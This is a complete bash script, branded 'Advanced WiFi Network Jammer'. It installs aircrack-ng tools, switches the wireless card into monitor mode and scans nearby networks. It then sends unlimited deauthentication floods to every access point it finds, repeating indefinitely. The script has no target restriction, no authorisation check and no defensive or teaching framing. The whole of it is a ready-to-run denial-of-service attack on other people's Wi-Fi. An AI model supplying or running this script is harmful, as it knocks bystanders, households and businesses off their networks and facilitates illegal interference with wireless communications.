#!/bin/bash

# Colors for stylish terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Temp file to store scan results
TEMP_FILE="/tmp/wifi_scan_results.txt"
INTERFACE=""
WIFI_LIST=()
BSSID_LIST=()
CHANNEL_LIST=()

# Function to display stylish banner
display_banner() {
    clear
    echo -e "${RED}"
    echo "██╗    ██╗██╗███████╗██╗     ██╗ █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ "
    echo "██║    ██║██║██╔════╝██║     ██║██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗"
    echo "██║ █╗ ██║██║█████╗  ██║     ██║███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝"
    echo "██║███╗██║██║██╔══╝  ██║     ██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗"
    echo "╚███╔███╔╝██║██║     ███████╗██║██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║"
    echo " ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${CYAN}========== Advanced WiFi Network Jammer ===========${NC}"
    echo ""
}

# Function to check and install dependencies
check_dependencies() {
    echo -e "${YELLOW}[*] Checking for required dependencies...${NC}"
    
    # List of required packages
    REQUIRED_PACKAGES=("aircrack-ng" "wireless-tools" "iw" "util-linux" "procps")
    MISSING_PACKAGES=()
    
    # Determine package manager
    if command -v apt-get &> /dev/null; then
        PKG_MANAGER="apt-get"
        PKG_CHECK="dpkg -l"
    elif command -v yum &> /dev/null; then
        PKG_MANAGER="yum"
        PKG_CHECK="rpm -q"
    elif command -v pacman &> /dev/null; then
        PKG_MANAGER="pacman"
        PKG_CHECK="pacman -Q"
    else
        echo -e "${RED}[!] Unsupported package manager. Please install dependencies manually: ${REQUIRED_PACKAGES[*]}${NC}"
        read -p "Continue anyway? (y/n) " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
        return
    fi
    
    # Check for missing packages
    for pkg in "${REQUIRED_PACKAGES[@]}"; do
        echo -ne "${BLUE}[*] Checking for ${pkg}...${NC}"
        if ! $PKG_CHECK $pkg &> /dev/null; then
            echo -e "${YELLOW}[MISSING]${NC}"
            MISSING_PACKAGES+=("$pkg")
        else
            echo -e "${GREEN}[INSTALLED]${NC}"
        fi
    done
    
    # Install missing packages if any
    if [ ${#MISSING_PACKAGES[@]} -gt 0 ]; then
        echo -e "${YELLOW}[*] Installing missing packages: ${MISSING_PACKAGES[*]}${NC}"
        case $PKG_MANAGER in
            apt-get)
                sudo apt-get update -y &> /dev/null
                sudo apt-get install -y "${MISSING_PACKAGES[@]}" &> /dev/null
                ;;
            yum)
                sudo yum install -y "${MISSING_PACKAGES[@]}" &> /dev/null
                ;;
            pacman)
                sudo pacman -Sy --noconfirm "${MISSING_PACKAGES[@]}" &> /dev/null
                ;;
        esac
        
        # Check if installation was successful
        for pkg in "${MISSING_PACKAGES[@]}"; do
            if ! $PKG_CHECK $pkg &> /dev/null; then
                echo -e "${RED}[!] Failed to install $pkg. Please install it manually.${NC}"
            else
                echo -e "${GREEN}[+] Successfully installed $pkg${NC}"
            fi
        done
    else
        echo -e "${GREEN}[+] All required packages are installed!${NC}"
    fi
}

# Function to find and set wireless interface
detect_interface() {
    echo -e "${YELLOW}[*] Detecting wireless interface...${NC}"
    
    # Get all wireless interfaces
    INTERFACES=$(iwconfig 2>&1 | grep -o "^[a-zA-Z0-9]*" | grep -v "lo" | grep -v "eth")
    
    # Check for monitor mode interfaces first
    for iface in $INTERFACES; do
        if iwconfig $iface 2>&1 | grep -q "Mode:Monitor"; then
            INTERFACE=$iface
            echo -e "${GREEN}[+] Found monitor mode interface: $INTERFACE${NC}"
            return
        fi
    done
    
    # If no monitor mode interface, use the first wireless interface
    for iface in $INTERFACES; do
        INTERFACE=$iface
        echo -e "${GREEN}[+] Using wireless interface: $INTERFACE${NC}"
        break
    done
    
    if [ -z "$INTERFACE" ]; then
        echo -e "${RED}[!] No wireless interface found. Exiting.${NC}"
        exit 1
    fi
}

# Function to enable monitor mode
enable_monitor_mode() {
    echo -e "${YELLOW}[*] Setting interface into monitor mode...${NC}"
    sudo airmon-ng check kill > /dev/null
    
    # Check if already in monitor mode
    if iwconfig $INTERFACE | grep -q "Mode:Monitor"; then
        echo -e "${GREEN}[+] Interface $INTERFACE is already in monitor mode${NC}"
        return
    fi
    
    # Enable monitor mode
    sudo airmon-ng start $INTERFACE > /dev/null
    
    # Check new interface name (could be wlan0mon, $INTERFACE'mon', etc.)
    NEW_IFACE=$(iwconfig 2>&1 | grep "Mode:Monitor" | grep -o "^[a-zA-Z0-9]*" | head -n 1)
    
    if [ -n "$NEW_IFACE" ]; then
        INTERFACE=$NEW_IFACE
        echo -e "${GREEN}[+] Monitor mode enabled on interface: $INTERFACE${NC}"
    else
        echo -e "${RED}[!] Failed to enable monitor mode. Trying alternative method...${NC}"
        sudo ip link set $INTERFACE down
        sudo iw dev $INTERFACE set type monitor
        sudo ip link set $INTERFACE up
        
        if iwconfig $INTERFACE | grep -q "Mode:Monitor"; then
            echo -e "${GREEN}[+] Monitor mode enabled with alternative method on: $INTERFACE${NC}"
        else
            echo -e "${RED}[!] Failed to enable monitor mode. Exiting.${NC}"
            exit 1
        fi
    fi
}

# Function to verify monitor mode
verify_monitor_mode() {
    echo -e "${YELLOW}[*] Verifying monitor mode...${NC}"
    
    if iwconfig $INTERFACE 2>&1 | grep -q "Mode:Monitor"; then
        echo -e "${GREEN}[+] Confirmed monitor mode is active on $INTERFACE${NC}"
    else
        echo -e "${RED}[!] Monitor mode not active. Exiting.${NC}"
        exit 1
    fi
}

# Function to scan for Wi-Fi networks
scan_wifi_networks() {
    echo -e "${YELLOW}[*] Scanning for Wi-Fi networks (10 seconds)...${NC}"
    
    # Clear previous results
    > $TEMP_FILE
    WIFI_LIST=()
    BSSID_LIST=()
    CHANNEL_LIST=()
    
    # Run airodump-ng for 10 seconds and save output
    timeout 10 sudo airodump-ng $INTERFACE --output-format csv -w /tmp/wifi_scan > /dev/null 2>&1
    
    # Parse the CSV file
    if [ -f "/tmp/wifi_scan-01.csv" ]; then
        # Skip the first line and get APs (not clients)
        tail -n +2 "/tmp/wifi_scan-01.csv" | grep -v "Station MAC" | awk -F, '{print $1","$4","$14}' | sed 's/ //g' > $TEMP_FILE
        
        # Clean up
        rm -f /tmp/wifi_scan-01.csv
        
        # Display results
        echo -e "${BLUE}========== Detected Wi-Fi Networks ==========${NC}"
        echo -e "${CYAN}#   BSSID               CH   SSID${NC}"
        echo -e "${CYAN}------------------------------------------${NC}"
        
        i=1
        while IFS=, read -r bssid channel essid; do
            # Skip empty SSIDs
            if [ -n "$essid" ]; then
                echo -e "${GREEN}$i)${NC} $bssid  ${YELLOW}$channel${NC}   ${CYAN}$essid${NC}"
                WIFI_LIST+=("$essid")
                BSSID_LIST+=("$bssid")
                CHANNEL_LIST+=("$channel")
                i=$((i+1))
            fi
        done < $TEMP_FILE
        
        echo ""
        echo -e "${BLUE}Total networks found: $((i-1))${NC}"
        echo ""
    else
        echo -e "${RED}[!] No networks found or scan failed.${NC}"
    fi
}

# Function to launch deauthentication attack
launch_deauth_attack() {
    echo -e "${RED}[*] Launching deauthentication attack on all networks...${NC}"
    
    # Count of networks
    local count=${#BSSID_LIST[@]}
    
    if [ $count -eq 0 ]; then
        echo -e "${RED}[!] No networks to attack. Rescanning...${NC}"
        return
    fi
    
    echo -e "${RED}[*] Sending deauth packets to $count networks for 1 minute...${NC}"
    
    # Start progress bar
    local duration=60  # 1 minute
    local start_time=$(date +%s)
    local end_time=$((start_time + duration))
    
    # Start deauth processes for each network
    local pids=()
    for i in $(seq 0 $((count-1))); do
        local bssid=${BSSID_LIST[$i]}
        local channel=${CHANNEL_LIST[$i]}
        local ssid=${WIFI_LIST[$i]}
        
        # Set channel before attack
        sudo iwconfig $INTERFACE channel $channel &>/dev/null
        
        # Launch deauth in background with unlimited frames (0)
        sudo aireplay-ng --deauth 0 -a "$bssid" $INTERFACE &>/dev/null &
        pids+=($!)
        
        echo -e "${YELLOW}[+] Attacking network ${PURPLE}$ssid${YELLOW} (${RED}$bssid${YELLOW}) on channel ${GREEN}$channel${NC}"
    done
    
    # Show progress bar for 1 minute
    while [ $(date +%s) -lt $end_time ]; do
        local current=$(date +%s)
        local elapsed=$((current - start_time))
        local percentage=$((elapsed * 100 / duration))
        
        # Create progress bar
        local progress=""
        local bar_length=30
        local filled_length=$((percentage * bar_length / 100))
        
        for ((i=0; i<filled_length; i++)); do
            progress="${progress}█"
        done
        
        for ((i=filled_length; i<bar_length; i++)); do
            progress="${progress}░"
        done
        
        echo -ne "${RED}[${progress}] ${percentage}%\r${NC}"
        sleep 1
    done
    
    echo -e "\n${GREEN}[*] Attack complete!${NC}"
    
    # Kill all deauth processes
    for pid in "${pids[@]}"; do
        kill $pid &>/dev/null
    done
    
    echo -e "${BLUE}[*] All deauth processes stopped${NC}"
}

# Function to reset Wi-Fi to normal
reset_wifi() {
    echo -e "${YELLOW}[*] Resetting Wi-Fi to normal state...${NC}"
    
    # Determine if the interface has "mon" in its name
    if [[ $INTERFACE == *"mon"* ]]; then
        BASE_INTERFACE=${INTERFACE%mon}
        sudo airmon-ng stop $INTERFACE &>/dev/null
        
        # Try to restart normal interface
        sudo ip link set $BASE_INTERFACE up &>/dev/null
    else
        # If interface doesn't have "mon", just set it to managed mode
        sudo ip link set $INTERFACE down &>/dev/null
        sudo iw dev $INTERFACE set type managed &>/dev/null
        sudo ip link set $INTERFACE up &>/dev/null
    fi
    
    # Restart network services
    sudo systemctl restart NetworkManager &>/dev/null || sudo service network-manager restart &>/dev/null
    
    echo -e "${GREEN}[+] Wi-Fi has been reset to normal state${NC}"
}

# Main function
main() {
    display_banner
    check_dependencies
    detect_interface
    enable_monitor_mode
    verify_monitor_mode
    
    # Trap Ctrl+C to clean up before exiting
    trap cleanup INT
    
    # Main loop
    while true; do
        scan_wifi_networks
        launch_deauth_attack
        echo -e "${PURPLE}[*] Restarting process...${NC}"
        sleep 2
    done
}

# Cleanup function when script is interrupted
cleanup() {
    echo ""
    echo -e "${YELLOW}[*] Interrupt received! Cleaning up...${NC}"
    reset_wifi
    rm -f $TEMP_FILE /tmp/wifi_scan-*.csv &>/dev/null
    echo -e "${GREEN}[+] Cleanup complete. Exiting.${NC}"
    exit 0
}

# Must run as root
if [ "$(id -u)" != "0" ]; then
    echo -e "${RED}[!] This script must be run as root${NC}"
    echo -e "${YELLOW}[*] Try: sudo $0${NC}"
    exit 1
fi

# Start main function
main
